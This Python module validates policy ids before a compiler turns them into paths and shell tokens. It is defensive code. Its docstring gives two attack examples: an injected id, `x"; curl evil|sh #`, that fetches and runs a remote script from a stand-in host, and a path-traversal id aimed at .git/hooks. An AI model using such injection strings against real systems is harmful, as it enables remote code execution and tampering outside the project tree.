"""The one rule for a policy id, and where it is enforced.

A policy id becomes both a compiled-output directory and a token spliced into emitted
git-hook bash and CI `run:` blocks. `validate` checks the id, but it is a separate step a
drop-in third-party policy never runs -- it reaches the compiler and installer directly.
So the rule lives here, in a leaf module the compile and add choke points import, rather
than only in the validation package.
"""

from __future__ import annotations

import re

#: Mirrored from manifest.schema.json. Because it admits only lowercase letters, digits and
#: hyphens, anything matching it is safe to splice into a shell command or a filesystem path.
#: Keep in sync with the schema.
POLICY_ID_RE = re.compile(r"^[a-z][a-z0-9-]{2,63}$")


class InvalidPolicyId(ValueError):
    """A policy id is unsafe to use as a path or command token, or disagrees with its folder."""


def validate_policy_id(policy_id: str, folder_name: str) -> None:
    """Raise InvalidPolicyId unless `policy_id` is schema-valid and equals its folder name.

    Enforced wherever an id turns into a path or a shell token -- compile and add -- not only
    in `validate`. An id like `x"; curl evil|sh #` or `../../.git/hooks` would otherwise
    execute or write outside the tree. Requiring id == folder also closes the lock-attestation
    gap, where a divergent id left `artifacts_sha256` silently unpinned.
    """
    if not isinstance(policy_id, str) or not POLICY_ID_RE.match(policy_id):
        raise InvalidPolicyId(
            f"policy id {policy_id!r} is not a valid identifier (must match {POLICY_ID_RE.pattern}); "
            "refusing to use it as a filesystem path or command token"
        )
    if policy_id != folder_name:
        raise InvalidPolicyId(f"policy id {policy_id!r} does not match its folder name {folder_name!r}")
